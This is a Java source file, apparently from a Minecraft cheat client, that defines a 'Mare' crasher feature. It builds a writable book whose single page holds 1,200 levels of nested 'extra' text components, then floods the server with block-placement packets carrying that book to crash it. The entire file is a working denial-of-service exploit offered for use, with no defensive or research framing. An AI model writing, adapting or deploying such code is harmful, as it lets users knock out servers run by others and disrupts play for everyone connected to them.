package com.skidding.atlas.primitive.impl.exploit;

import com.skidding.atlas.module.ModuleCategory;
import com.skidding.atlas.primitive.PrimitiveFeature;
import com.skidding.atlas.primitive.argument.Argument;
import com.skidding.atlas.util.minecraft.chat.ChatUtil;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.util.BlockPos;

public class MarePrimitive extends PrimitiveFeature {


    public MarePrimitive() {
        super("Mare", "Attempts to crash the server using NBT data", ModuleCategory.CRASHER,
                new Argument("Packets", 0, Integer.class));
    }

    @Override
    public void execute(Object... args) {
        long start = System.currentTimeMillis();
        int packets = (int) args[0];

        for (int i = 0; i < packets; i++) {
            getPlayer().sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(getPlayer().posX, getPlayer().posY, getPlayer().posZ), 2, getBook(), 0.0f, 0.0f, 0.0f));
        }

        ChatUtil.print(STR."Sent \{packets} packets in \{System.currentTimeMillis() - start}ms");
    }

    private ItemStack getBook() {
        ItemStack itemStack = new ItemStack(Items.writable_book);
        NBTTagCompound compound = new NBTTagCompound();

        NBTTagList pages = new NBTTagList();
        StringBuilder stringBuilder = new StringBuilder().append("{");
        int n2 = 1200;
        int n;
        for (n = 0; n < 1200; ++n) {
            stringBuilder.append("extra:[{");
        }
        for (n = 0; n < 1200; ++n) {
            stringBuilder.append("text:⾟}],");
        }
        stringBuilder.append("text:⾟}");

        pages.appendTag(new NBTTagString(stringBuilder.toString()));
        compound.setTag("pages", pages);
        itemStack.setTagCompound(compound);

        return itemStack;
    }

}
